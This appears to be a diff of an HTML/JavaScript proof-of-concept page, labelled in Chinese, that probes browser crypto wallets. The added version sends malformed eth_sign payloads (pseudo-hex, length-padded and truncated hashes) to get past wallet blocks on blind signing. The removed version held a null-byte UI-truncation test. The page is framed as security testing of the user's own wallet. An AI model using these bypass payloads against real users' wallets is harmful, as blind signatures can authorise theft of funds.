@@ -2,118 +2,90 @@
 <html lang="zh-CN">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>eth_sign 安全水位与 UI 截断测试 PoC</title>
+    <title>eth_sign 防火墙规则探测器</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.11.1/ethers.umd.min.js"></script>
     <style>
-        body { font-family: monospace; max-width: 800px; margin: 20px auto; padding: 20px; background-color: #f4f4f9; color: #333; }
-        h2 { color: #2c3e50; }
-        button { padding: 12px 20px; margin: 10px 10px 10px 0; cursor: pointer; background-color: #007bff; color: white; border: none; border-radius: 6px; font-weight: bold; font-size: 14px;}
-        button.danger { background-color: #dc3545; }
-        button:hover { opacity: 0.9; }
-        button:disabled { background-color: #cccccc; cursor: not-allowed; color: #666;}
-        #console { background: #1e1e1e; color: #00ff00; padding: 15px; border-radius: 8px; height: 350px; overflow-y: auto; white-space: pre-wrap; font-size: 13px; border: 2px solid #333; }
-        .info-box { margin-bottom: 20px; padding: 15px; background: #e9ecef; border-left: 5px solid #007bff; border-radius: 4px; line-height: 1.5; }
-        .highlight { font-weight: bold; color: #dc3545; }
+        body { font-family: monospace; max-width: 900px; margin: 20px auto; padding: 20px; background-color: #f4f4f9; color: #333; }
+        button { padding: 12px; margin: 8px 8px 8px 0; cursor: pointer; background-color: #007bff; color: white; border: none; border-radius: 6px; font-weight: bold;}
+        button.bypass { background-color: #fd7e14; }
+        button:disabled { background-color: #ccc; cursor: not-allowed; }
+        #console { background: #1e1e1e; color: #00ff00; padding: 15px; border-radius: 8px; height: 400px; overflow-y: auto; white-space: pre-wrap; font-size: 13px; }
     </style>
 </head>
 <body>
-    <h2>Wallet eth_sign Security Tester</h2>
-    <div class="info-box">
-        此 PoC 脚本通过调用 <code>window.ethereum</code> 接口，直接向当前浏览器注入的 Web3 钱包发送 <code>eth_sign</code> RPC 请求。<br><br>
-        <strong>测试目标：</strong><br>
-        1. 探针 A：测试钱包是否从底层或 UI 层面拦截了高危的裸哈希盲签。<br>
-        2. 探针 B：测试钱包的 UI 渲染引擎是否存在 <code>\x00</code> (Null Byte) 截断视觉欺骗漏洞。
-    </div>
-
+    <h2>eth_sign 防火墙盲区探测 (Bypass Probes)</h2>
     <div>
-        <button id="btnConnect">1. 连接钱包 (获取授权)</button>
-        当前测试地址: <span id="walletAddress" style="font-weight: bold; color: #007bff;">未连接</span>
+        <button id="btnConnect">1. 连接钱包</button>
+        地址: <span id="walletAddress" style="color:#007bff; font-weight:bold;">未连接</span>
     </div>
 
-    <div style="margin-top: 15px; border-top: 1px dashed #ccc; padding-top: 15px;">
-        <button id="btnStandardSign" class="danger" disabled>2. 探针 A: 发送标准 eth_sign 请求</button>
-        <button id="btnNullByteSign" class="danger" disabled>3. 探针 B: 发送 0x00 截断 Payload</button>
+    <div style="margin-top: 20px; border-top: 1px dashed #ccc; padding-top: 20px;">
+        <button id="btnProbe1" class="bypass" disabled>探针 1: 非法 Hex 字符注入 (复刻第一版)</button>
+        <button id="btnProbe2" class="bypass" disabled>探针 2: 长度欺骗 (末尾追加 00)</button>
+        <button id="btnProbe3" class="bypass" disabled>探针 3: 长度欺骗 (非 32 字节的纯 Hex)</button>
     </div>
 
-    <h3 style="margin-top: 30px;">测试输出日志 (Console):</h3>
-    <div id="console">等待操作初始化...</div>
+    <h3 style="margin-top: 20px;">探测日志:</h3>
+    <div id="console">等待操作...</div>
 
     <script>
-        const btnConnect = document.getElementById('btnConnect');
-        const btnStandardSign = document.getElementById('btnStandardSign');
-        const btnNullByteSign = document.getElementById('btnNullByteSign');
         const elAddress = document.getElementById('walletAddress');
         const elConsole = document.getElementById('console');
-
         let currentAccount = null;
 
-        function log(message) {
-            const time = new Date().toLocaleTimeString();
-            elConsole.innerHTML += `[${time}] ${message}\n`;
+        function log(msg) {
+            elConsole.innerHTML += `[${new Date().toLocaleTimeString()}] ${msg}\n`;
             elConsole.scrollTop = elConsole.scrollHeight;
         }
 
-        // 1. 连接钱包获取地址
-        btnConnect.addEventListener('click', async () => {
-            if (typeof window.ethereum !== 'undefined') {
+        document.getElementById('btnConnect').addEventListener('click', async () => {
+            if (window.ethereum) {
                 try {
-                    log("正在向 provider 发送 eth_requestAccounts 请求...");
                     const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-                    currentAccount = accounts[0];
+                    currentAccount = accounts[0]; 
                     elAddress.innerText = currentAccount;
-                    log(`✅ 钱包连接成功。当前地址: ${currentAccount}`);
-                    btnStandardSign.disabled = false;
-                    btnNullByteSign.disabled = false;
-                } catch (error) {
-                    log(`❌ 连接被拒绝或出错: ${error.message} (Code: ${error.code})`);
+                    log(`✅ 已连接: ${currentAccount}`);
+                    document.querySelectorAll('.bypass').forEach(b => b.disabled = false);
+                } catch (e) { log(`❌ 连接失败: ${e.message}`); }
+            }
+        });
+
+        async function sendProbe(probeName, payload) {
+            if (!currentAccount) return;
+            log(`\n--- 🚀 执行 [${probeName}] ---`);
+            log(`发送的 Payload: ${payload}`);
+            
+            try {
+                const sig = await window.ethereum.request({ method: 'eth_sign', params: [currentAccount, payload] });
+                log(`🚨 [绕过成功！] 钱包防火墙被击穿，拿到签名:\n${sig}`);
+                
+                // 瞬间验证
+                if(typeof ethers !== 'undefined') {
+                    try {
+                        const rec = ethers.recoverAddress(payload, sig).toLowerCase();
+                        log(rec === currentAccount.toLowerCase() ? `💥 [高危] 密码学鉴定：这是真正的 eth_sign 盲签！` : `⚠️ 鉴定失败或已被转换为 personal_sign`);
+                    } catch(e) { log(`ℹ️ ethers.js 无法解析该格式的恢复。`); }
                 }
-            } else {
-                log("⚠️ 未检测到 window.ethereum 提供者！请确保你已在浏览器中安装并启用了钱包插件。");
+            } catch (error) {
+                log(`🛡️ 拦截成功: ${error.message} (防火墙防住了此探针)`);
             }
+        }
+
+        // 探针 1：复刻你第一版能唤起的包含字母的伪 Hex
+        document.getElementById('btnProbe1').addEventListener('click', () => {
+            sendProbe("探针 1: 非法 Hex", "0x11223344Some_evil_content");
         });
 
-        // 2. 标准 eth_sign 测试
-        btnStandardSign.addEventListener('click', async () => {
-            if (!currentAccount) return;
-            // 构造一个模拟的 32-byte 交易哈希的十六进制字符串
-            const payload = "0x89c9e5fa472f883b6f007bc9543e2621c1f55b9e0f34033dfd720c24298150a0";
-            log(`\n--- 🚀 执行探针 A: 标准 eth_sign ---`);
-            log(`发送的 Payload (模拟恶意交易哈希): ${payload}`);
-            
-            try {
-                const signature = await window.ethereum.request({
-                    method: 'eth_sign',
-                    params: [currentAccount, payload]
-                });
-                log(`🚨 [高危] 钱包未实施拦截！成功拿到签名:\n${signature}`);
-            } catch (error) {
-                log(`🛡️ [安全] 钱包成功拦截或你拒绝了请求。\n返回信息: ${error.message} (Code: ${error.code})`);
-            }
+        // 探针 2：经典的 0x00 长度填充绕过 (32字节哈希 + 00)
+        document.getElementById('btnProbe2').addEventListener('click', () => {
+            const rawHash = "0x89c9e5fa472f883b6f007bc9543e2621c1f55b9e0f34033dfd720c24298150a0";
+            sendProbe("探针 2: 追加 00", rawHash + "00"); // 变成 33 字节
         });
 
-        // 3. 0x00 截断 (Null Byte Truncation) 测试
-        btnNullByteSign.addEventListener('click', async () => {
-            if (!currentAccount) return;
-            // 构造 Payload: "SafeMessage\x00EvilData" 的 Hex 编码
-            // "SafeMessage" -> 536166654d657373616765
-            // "\x00"        -> 00
-            // "EvilData"    -> 4576696c44617461
-            const payload = "0x536166654d657373616765004576696c44617461";
-            
-            log(`\n--- 🚀 执行探针 B: 0x00 UI 截断测试 ---`);
-            log(`发送的 Payload (Hex): ${payload}`);
-            log(`🔍 观察点：请仔细查看钱包弹出的签名确认界面。`);
-            log(`如果界面上只能看到 "SafeMessage" (或对应的 ASCII 解析)，而 "EvilData" 凭空消失了，说明该钱包存在视觉截断漏洞！`);
-            
-            try {
-                const signature = await window.ethereum.request({
-                    method: 'eth_sign',
-                    params: [currentAccount, payload]
-                });
-                log(`🚨 [高危] 获取到签名！UI 可能被成功欺骗:\n${signature}`);
-            } catch (error) {
-                 log(`🛡️ [安全或取消] 请求未完成。\n返回信息: ${error.message} (Code: ${error.code})`);
-            }
+        // 探针 3：纯 Hex，但故意少一个字节 (31字节)
+        document.getElementById('btnProbe3').addEventListener('click', () => {
+            const shortHash = "0x89c9e5fa472f883b6f007bc9543e2621c1f55b9e0f34033dfd720c24298150"; 
+            sendProbe("探针 3: 31字节 Hex", shortHash);
         });
     </script>
 </body>
